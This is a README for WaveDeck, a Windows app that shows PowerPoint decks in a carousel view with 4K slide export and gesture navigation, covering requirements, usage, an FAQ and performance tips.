# 🖥️ textwavedeck - Professional presentations with smooth cinematic control

[![Download WaveDeck](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Arase6092/textwavedeck/releases)

WaveDeck provides a local-first interface for Windows users to manage PowerPoint presentations. It offers high-resolution 4K slide exports, a clear thumbnail preview, and a smooth carousel style for moving between slides. The system supports gesture-based control for modern hardware.

## 📋 System Requirements

To run WaveDeck, ensure your computer meets these minimum standards:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Intel Core i5 or equivalent processor.
*   Memory: 8 GB of RAM.
*   Graphics: Hardware supporting DirectX 12 for smooth 4K rendering.
*   Software: Microsoft PowerPoint installed on your machine.

## ⚙️ Using the Application

WaveDeck integrates with your existing PowerPoint files. Once the software opens, you can import your .pptx files directly into the carousel view. 

*   Load your deck: Select your PowerPoint file from the file explorer window inside the app.
*   Preview: Use the thumbnail bar at the bottom to jump to specific sections of your presentation.
*   Navigation: Use your mouse wheel or touch gestures to scroll through the cinematic carousel.
*   Export: Select the export tool in the settings menu to save your slides as high-quality 4K images.

## 💡 Frequently Asked Questions

**Do I need an internet connection to use WaveDeck?**
No. WaveDeck runs locally on your PC. You do not need the internet to load or present your slides.

**Does this app change my original PowerPoint file?**
No. WaveDeck reads your files without modifying the original data. Your PowerPoint file stays safe.

**How do I enable gestures?**
The app detects gesture-ready hardware automatically. If your screen or trackpad supports touch, gestures work immediately upon launching the presentation mode.

**Can I export specific slides or the whole deck?**
The export tool allows you to select single slides or the full presentation for 4K image conversion.

## 🛠️ Performance Tips

Keep your system drivers up to date to ensure the best performance during large presentations. If you notice stutter in the carousel view, close other heavy applications like web browsers or video editors. WaveDeck handles large files well, but high-resolution slides consume more memory during rotation.
